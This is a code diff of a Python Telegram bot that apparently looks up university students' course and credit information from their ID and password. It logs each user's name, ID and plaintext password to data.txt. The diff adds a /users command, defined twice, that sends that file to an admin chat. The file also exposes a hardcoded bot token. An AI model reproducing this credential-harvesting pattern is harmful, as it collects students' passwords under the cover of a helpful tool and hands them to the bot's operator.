@@ -13,6 +13,13 @@ btn.add(dev)
 
 token = "6410467729:AAE35oFq2b1ogyxZMIlA_VbYC60DKJB9neY"
 bot = telebot.TeleBot(token)
+@bot.message_handler(commands=['users'])
+def users_command(message):
+    if str(message.chat.id) == str(admin_chat_id):
+        with open('data.txt', 'rb') as file:
+            bot.send_document(admin_chat_id, file)
+    else:
+        bot.reply_to(message, 'ليس لديك صلاحية الوصول لهذا الأمر.')
 
 @bot.message_handler(commands=['start'])
 def welcome(message):
@@ -134,15 +141,19 @@ def send_sms(message, chat_id, number):
     json_text = soup.get_text()
     data2 = json.loads(json_text)
     name=data2["stuName"]
-    file=open("information/data.txt","a")
-    file.write(f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n")
-    
-    
-    
-    
-
+    with open('data.txt', 'a') as file:
+    	file.write(f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n")
 
     calculate_and_send_course_info(chat_id, data2)
+@bot.message_handler(commands=['users'])
+def users_command(message):
+    if str(message.chat.id) == admin_chat_id:
+        with open('data.txt', 'rb') as file:
+            bot.send_document(admin_chat_id, file)
+    else:
+        bot.reply_to(message, 'ليس لديك صلاحية الوصول لهذا الأمر.')
+
+
 
 def calculate_and_send_course_info(chat_id, data2):
     try:
@@ -217,4 +228,4 @@ def print_course_info(course_data, semester_name):
 
     return total_credits, message_text
 
-bot.polling() 
+bot.polling()
